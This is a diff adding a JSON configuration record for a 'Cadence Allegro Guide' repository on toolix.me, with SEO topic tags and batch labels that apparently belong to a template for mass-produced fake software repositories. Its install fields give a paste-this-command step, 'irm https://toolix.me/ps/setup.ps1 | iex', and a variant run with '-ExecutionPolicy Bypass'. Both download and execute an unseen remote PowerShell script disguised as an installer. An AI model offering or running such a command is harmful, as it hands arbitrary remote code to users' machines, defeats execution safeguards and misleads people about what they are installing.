@@ -1,0 +1,27 @@
+{
+  "repo": "Cadence-Allegro-Guide",
+  "product": "Cadence Allegro Guide",
+  "product_title": "Cadence Allegro Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-cadence-allegro-guide",
+    "cadence-allegro-guide-app",
+    "developer-tools",
+    "coding-workflow",
+    "terminal-client",
+    "database-tools",
+    "cadence-allegro-guide-windows-tool",
+    "cadence-allegro-guide-modeling-tool",
+    "cadence-allegro-guide",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
